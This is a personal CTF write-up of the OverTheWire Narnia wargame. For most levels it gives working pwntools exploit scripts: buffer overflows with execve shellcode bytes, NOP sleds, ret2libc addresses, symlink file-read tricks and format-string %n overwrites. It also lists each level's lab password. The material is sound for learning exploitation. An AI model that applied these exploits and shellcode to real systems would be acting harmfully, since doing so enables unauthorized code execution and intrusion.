
`ssh narniax@narnia.labs.overthewire.org -p 2226`

`scp -P 2226 narniax@narnia.labs.overthewire.org:/narnia/narniax .`
`scp -P 2226 narniax@narnia.labs.overthewire.org:/narnia/narniax.c .`

very useful resource to write shit in pwntools
https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html

## narnia0 : narnia0 

So, the first challenge is a basic bufferoverflow attack. As, I didn't want to solve it in the conventional way (using `echo` or `python -c print`), I took this as a chance to get used to the commands in gdb (peda), and make a script in pwntools.


Learning to ssh with pwntools and running a binary as a process. I first downloaded the files and ran the exploit locally, then added the ssh part later.
I am deffo gonna be writing all my exploits in pwntools, as it's more naturally to me to write exploits in python than using bash commands.


Here's my exploit 
```python
from pwn import *

shell = ssh('narnia0', 'narnia.labs.overthewire.org', password='narnia0', port=2226)

  

context.update(arch='i386', os='linux')

  

# create a process

p = shell.process("/narnia/narnia0")

  

print(p.recvline())

  

a = b"aaaabaaacaaadaaaeaaa\xef\xbe\xad\xde"

  

p.sendline(a)

  

print(p.recvline())

print(p.recvline())

p.interactive()
```

## narnia1 : efeidiedae

So, we need a persitent ENV variable which gets executed.

We need a shell code, but how do we have a env variable that is presistent. 

First, we copy `.bashrc` and to a temporary folder, add one line that is the enviromental variable, this variable should be persistent :D 

oh and make sure to `source ` the file

okay, now that we can have a variable that will be executed, let's now craft our shellcode, I discovered that pwntools does this for you easily (pwntools is just op)

```python
from pwn import *
print(asm(shellcraft.linux.sh()))
```

run the script, copy the bytes to the enviromental variable, should look something like 

```bash
export EGG = $'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

This creates a function in assembly that will syscall to give us shell :triumph:

I spent a bit of time trying to ret2libc, but this was the wrong way craft a shell code, the solution I figured out was was much easier than this. I dont want to waste all that research, so here's stuff i learnt

#### retlibc attempt research

Let's find the address of system 

https://security.stackexchange.com/questions/195246/how-to-find-address-of-system-in-an-executable-rop-exploit

address of system : `0xf7e4c850`

Let's find the address of /bin/sh
https://stackoverflow.com/questions/49684686/buffer-overflow-to-bin-sh

```bash
find &system,+9999999,"/bin/sh"
```

address of sh: `0xf7f6ecc8`

way to create ret2libc exploits 
`&system | 00 | &bin/sh`
https://tripoloski1337.github.io/ctf/2020/01/26/return-to-libc-attack.html
^ writeup that helped.


## narnia2 : nairiepecu
Looking at the code, I have a feeling that it might be overwriting the EIP and making it call our shell code function that we injected.

Inspecting in gdb, we see that
```
r $(cyclic 136)
cyclic -l "iaab"
```

The eip is overwritten after 132 bytes in the  buffer, the last 4 bytes overwrites EIP.

Perhaps, we can inject our shellcode here? Let's try

This was a straightforward chall but I didn't understand why jumping directly to shellcode usually doesnt work, and that you need NOP instructions to pad the EIP so we dont miss the exact bytecode where the shellcode would be executed.

Another important thing is reading what's in the stack, and jumping in the middle of the NOP operation, this is known as NOPsled, also your local exploit address and machine address will be different so be sure to get the exact memory address in the narnia machine's gdb :)

```bash
x/300wx $sp
```

```python
from pwn import *

add = # get it from gdb


b = "6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80"

b = bytes.fromhex(b)

a = b"\x90"*(132-len(b))

a +=b

  

a += p32(add)

print(a)

f = open("bruh","wb")

f.write(a)

f.close()

```

## narnia3 : vaequeezee

Was lucky that my first idea worked :D 

We dont give a file name, we give string

read from =`etc/narnia_pass/narnia3` through symlink

`cat /etc/narnia_pass/narnia4'
now overflow until we overwrite `/dev/null` with our filename


sym link to readfrom

write to `/tmp/maey/b`

`/tmp/maey/A* n +"/" + tmp/maey/b`  - symlink

I did a lazy and made all these files in a seperate instance of ssh, so i can run the scripts
it looks like a pain making files in pwntools ssh instance

```bash
mkdir /tmp/maey
cd /tmp/maey
touch b
chmod -R 777 .
mkdir AAAAAAAAAAAAAAAAAAAAAA
cd AAAAAAAAAAAAAAAAAAAAAA
mkdir tmp
cd tmp
mkdir maey
ln -s /etc/narnia_pass/narnia4 b
chmod -R 777 .
```

```python
from pwn import *

shell = ssh('narnia3', 'narnia.labs.overthewire.org', password='vaequeezee', port=2226)

  

context.update(arch='i386', os='linux')

file2 = b"tmp/maey/b"

  

file1 = b"/tmp/maey/"

file1 += b"A"*(32-len(file1))+b"/"

file1 +=file2

print(file1)

p = shell.process([b"/narnia/narnia3",file1])

print(p.recvline())
```

Flag should be written to `/tmp/maey/b` :)

this was a cool challenge that makes you apply what you learn in the previous challs :D


## narnia4 : thaenohtai

Essentially narnia2??? the enviromental variables are set to Null so, we cant use narnia1, but i guess i used the harder solution earlier?? lol
https://man7.org/linux/man-pages/man7/environ.7.html

## narnia5 :  faimahchiy
Very cool easy challenge about overwriting an address using format string, 
https://cs155.stanford.edu/papers/formatstring-1.2.pdf
it was my source of reference to learn about this attack. basic gist of it was, first I wrote some arbitary bytes with the address I wanted to overwrite, then i brute forced to get the offset to the where my address is situated this would where we use spooky `%n` to write values to, since i printed `36` bytes already, we need `500-36` to be the `%(500-36)u%n` to overwrite the address. 
Really made me understand how printf works :), script here

```python
from pwn import *

  

shell = ssh('narnia5', 'narnia.labs.overthewire.org', password='faimahchiy', port=2226)

ad = 0xffffdcd0

for i in range(0,100):

a= b"A"*(64-32)+p32(ad)+(f'%{i}$08x').encode()

  

print(a,i)

p = shell.process(["/narnia/narnia5",a])

  

(p.recvline())

buf = (p.recvline())

print(buf)

buf =buf.split(b"[")[1].strip().split(b"]")[0][-8:]

if buf[0:2]!=b"0x":

buf = b"0x"+buf

print(buf)

pointer = (p.recvline())

pointer =pointer.split(b"(")[1].strip().split(b")")[0]

  

print(pointer)

if buf==pointer or buf==p32(ad):

p.close()

  

loca = (i)

payload = b"A"*(64-32)+p32(ad)+b"%464u"+(f'%{loca}$n').encode()

print(payload)

p = shell.process(["/narnia/narnia5",payload])

p.interactive()

break

  

p.close()
```

## narnia6 : neezocaeng
argument 1 overwrite with "/bin/sh;" + overwrite with system address 
argument 2 nothing
ignore some parts of the code, as it was me trying to figure out alternative way to get system addreses in libc in pwntools, keeping it here as a reference.
```python
from pwn import *

shell = ssh('narnia6', 'narnia.labs.overthewire.org', password='neezocaeng', port=2226)

libc = ELF("./libc.so.6")

# e = ELF("/narnia/narnia6")

binsh_sr = p32(next(libc.search(b"/bin/sh")))

system_add = p32(0xf7e4c850)

print(binsh_sr)

# 16 to write

payload = cyclic(8)

  

payload = b"/bin/sh;"

payload+=system_add

  

print(payload)

p = shell.process(["/narnia/narnia6",payload,b""])

p.interactive()
```


## narnia7 : ahkiaziphu

formatstring, but you bruteforce until you edit the correct address, my script initially would hang at iteration 10, but would be fine at every at iteration, soon i realised, it was where the flag was :D. 


## narnia8 :  mohthuphog




## narnia9 : 


